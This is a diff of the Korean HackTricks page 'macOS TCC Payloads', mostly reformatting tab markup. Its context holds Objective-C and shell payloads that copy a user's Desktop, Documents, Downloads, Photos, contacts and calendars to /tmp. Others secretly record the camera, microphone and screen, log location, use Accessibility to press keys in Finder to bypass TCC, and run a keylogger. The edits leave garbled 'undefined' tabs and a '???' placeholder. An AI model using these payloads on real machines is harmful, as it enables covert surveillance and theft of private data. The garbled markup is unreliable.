@@ -1,4 +1,4 @@
-# macOS TCC 페이로드
+# macOS TCC Payloads
 
 <details>
 
@@ -9,7 +9,7 @@ HackTricks를 지원하는 다른 방법:
 * **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
 * **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.
 
 </details>
@@ -22,6 +22,7 @@ HackTricks를 지원하는 다른 방법:
 {% tabs %}
 {% tab title="Objective-C" %}
 `$HOME/Desktop`을 `/tmp/desktop`로 복사합니다.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -57,6 +58,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="쉘" %}
 `$HOME/Desktop`을 `/tmp/desktop`로 복사합니다.
+
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -69,8 +71,11 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 * **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {% tabs %}
-{% tab title="ObjetiveC" %}
+{% tab title="undefined" %}
 `$HOME/Documents`를 `/tmp/documents`로 복사합니다.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -102,8 +107,11 @@ NSLog(@"Copy completed successfully.", error);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 `$HOME/`Documents를 `/tmp/documents`로 복사합니다.
+
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -116,8 +124,11 @@ cp -r "$HOME/Documents" "/tmp/documents"
 * **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {% tabs %}
-{% tab title="ObjectiveC" %}
+{% tab title="undefined" %}
 `$HOME/Downloads`를 `/tmp/downloads`로 복사합니다.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -149,8 +160,11 @@ NSLog(@"Copy completed successfully.", error);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 `$HOME/Downloads`를 `/tmp/downloads`로 복사합니다.
+
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
@@ -163,8 +177,11 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 * **TCC**: `kTCCServicePhotos`
 
 {% tabs %}
-{% tab title="ObjetiveC" %}
+{% tab title="undefined" %}
 `$HOME/Pictures/Photos Library.photoslibrary`를 `/tmp/photos`로 복사합니다.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -196,8 +213,11 @@ NSLog(@"Copy completed successfully.", error);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 `$HOME/Pictures/Photos Library.photoslibrary`를 `/tmp/photos`로 복사합니다.
+
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -212,6 +232,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 `$HOME/Library/Application Support/AddressBook`을 `/tmp/contacts`로 복사합니다.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -247,6 +268,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="쉘" %}
 `$HOME/Library/Application Support/AddressBook`를 `/tmp/contacts`로 복사합니다.
+
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
@@ -261,6 +283,7 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 {% tabs %}
 {% tab title="ObjectiveC" %}
 `$HOME/Library/Calendars`를 `/tmp/calendars`로 복사합니다.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -296,12 +319,13 @@ fclose(stderr); // Close the file stream
 
 {% tab title="쉘" %}
 `$HOME/Library/Calendars`를 `/tmp/calendars`로 복사합니다.
+
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
-{% tabs %}
-{% tab title="ObjetiveC - 녹화" %}
-3초 동영상을 녹화하고 **`/tmp/recording.mov`**에 저장합니다.
+
+3초 동영상을 녹화하고 \*\*`/tmp/recording.mov`\*\*에 저장합니다.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -377,14 +401,11 @@ VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
 fclose(stderr); // Close the file stream
 }
 ```
-{% endtab %}
 
-{% tab title="ObjectiveC - 확인" %}
 카메라에 대한 프로그램의 접근 권한을 확인합니다.
-{% endtab %}
 
-{% tab title="Swift - Check" %}
 Check if the program has access to the camera.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -414,11 +435,9 @@ freopen("/tmp/logs.txt", "a", stderr);
 fclose(stderr); // Close the file stream
 }
 ```
-{% endtab %}
 
-{% tab title="쉘" %}
 카메라로 사진을 찍습니다.
-{% endtab %}
+
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
@@ -433,6 +452,7 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 {% tabs %}
 {% tab title="ObjectiveC - 녹음" %}
 5초 동안 오디오를 녹음하고 `/tmp/recording.m4a`에 저장합니다.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -532,8 +552,10 @@ fclose(stderr); // Close the file stream
 {% endtab %}
 
 {% tab title="ObjectiveC - 확인" %}
-앱이 마이크에 접근할 수 있는지 확인합니다. 
+앱이 마이크에 접근할 수 있는지 확인합니다.
 {% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -561,8 +583,11 @@ static void telegram(int argc, const char **argv) {
 [MicrophoneAccessChecker hasMicrophoneAccess];
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 5초 동안 오디오를 녹음하고 `/tmp/recording.wav`에 저장합니다.
+
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -584,6 +609,7 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {% tabs %}
 {% tab title="ObjectiveC" %}
 `/tmp/logs.txt`에 위치 정보를 기록하세요.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -635,12 +661,20 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {% tab title="쉘" %}
 위치에 액세스하기
 {% endtab %}
+
+{% tab title="undefined" %}
 ```
 ???
 ```
+{% endtab %}
+
+{% tab title="undefined" %}
 {% tabs %}
-{% tab title="ObjectiveC" %}
+{% tab title="undefined" %}
 주요 화면을 5초 동안 `/tmp/screen.mov`에 녹화합니다.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -694,20 +728,32 @@ CFRunLoopRun();
 freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 주요 화면을 5초 동안 녹화합니다.
+
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {% endtab %}
 {% endtabs %}
+{% endtab %}
 
-### 접근성
+{% tab title="undefined" %}
+#### 접근성
+{% endtab %}
 
+{% tab title="undefined" %}
 * **권한**: 없음
 * **TCC**: `kTCCServiceAccessibility`
+{% endtab %}
 
+{% tab title="undefined" %}
 TCC 권한을 사용하여 Finder의 엔터 키를 눌러 제어를 받고, 이를 통해 TCC를 우회합니다.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -758,8 +804,11 @@ usleep(100000); // 0.1 seconds
 return 0;
 }
 ```
+{% endtab %}
+
 {% tab title="Keylogger" %}
-눌린 키를 **`/tmp/keystrokes.txt`**에 저장합니다.
+눌린 키를 \*\*`/tmp/keystrokes.txt`\*\*에 저장합니다.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -879,7 +928,7 @@ HackTricks를 지원하는 다른 방법:
 * **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
 * **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
 
 </details>
